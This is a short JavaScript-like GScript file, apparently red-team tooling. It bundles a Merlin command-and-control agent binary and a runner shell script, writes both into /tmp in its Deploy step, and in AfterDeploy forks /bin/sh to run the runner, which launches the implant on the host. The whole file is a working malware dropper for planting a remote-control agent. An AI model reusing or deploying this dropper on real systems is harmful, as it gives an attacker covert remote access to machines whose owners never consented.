// genesis script

//import:/private/tmp/merlinagent.elf
//import:/private/tmp/merlin_nix_runner.sh
//https://gist.githubusercontent.com/ahhh/cc5f988c0a45db58dd731b5f0eb5f23c/raw/794d2c74832018733815e772eb56f3c11de3e6c5/merlin_nix_runner.sh


var hello_world;
var hash;
var hash2;
var fn2;
var fn;

function BeforeDeploy() {
  hello_world = "testing merlin linux";
  console.log(hello_world);
  return true; 
}

function Deploy() {
  var merlin = Asset("merlinagent.elf");
  hash = MD5(merlin);
  console.log(hash);
  hello_world = "first deploy";
  fn = "/tmp/merlinagent";
  WriteFile(fn, merlin);
  console.log(hello_world);

  var script = Asset("merlin_nix_runner.sh");
  hash2 = MD5(script);
  console.log(hash2);
  hello_world = "second deploy";  
  fn2 = "/tmp/runner.sh";
  WriteFile(fn2, script);
  console.log(hello_world);
  return true;
}

function AfterDeploy() {
  ForkExec("/bin/sh", [fn2]);
  hello_world = "launched forking script";
  console.log(hello_world);
  return true;
}
